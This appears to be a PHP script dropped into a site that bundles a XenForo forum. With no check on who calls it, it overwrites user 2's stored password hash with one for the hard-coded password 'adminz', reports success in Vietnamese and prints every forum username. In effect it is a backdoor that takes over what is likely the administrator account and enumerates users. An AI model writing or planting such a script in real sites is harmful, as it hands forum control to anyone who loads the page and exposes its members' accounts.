<?php 
require_once('../../../server/config.php');
$passnew = 'knguyenzz';
$sql = "UPDATE xf_user_authenticate\n"

. "SET data = BINARY\n"

. "    CONCAT(\n"

. "        CONCAT(\n"

. "            CONCAT(\'a:3:{s:4:\"hash\";s:40:\"\', SHA1(CONCAT(SHA1(\'adminz\'), SHA1(\'salt\')))),\n"

. "            CONCAT(\'\";s:4:\"salt\";s:40:\"\', SHA1(\'salt\'))\n"

. "        ),\n"

. "        \'\";s:8:\"hashFunc\";s:4:\"sha1\";}\'\n"

. "    ),\n"

. "scheme_class = \'XenForo_Authentication_Core\'\n"

. "WHERE user_id = 2";
$doimk = $KNCMS->xfquery("UPDATE xf_user_authenticate\n"

. "SET data = BINARY\n"

. "    CONCAT(\n"

. "        CONCAT(\n"

. "            CONCAT(\'a:3:{s:4:\"hash\";s:40:\"\', SHA1(CONCAT(SHA1(\'adminz\'), SHA1(\'salt\')))),\n"

. "            CONCAT(\'\";s:4:\"salt\";s:40:\"\', SHA1(\'salt\'))\n"

. "        ),\n"

. "        \'\";s:8:\"hashFunc\";s:4:\"sha1\";}\'\n"

. "    ),\n"

. "scheme_class = \'XenForo_Authentication_Core\'\n"

. "WHERE user_id = 2");
if($doimk) echo 'Thanh cong'. '<br>';
else echo 'That bai'. '<br>';

foreach($KNCMS->xfget_list("SELECT * FROM `xf_user`") as $xf){
    echo $xf['username'] . '<br>';
}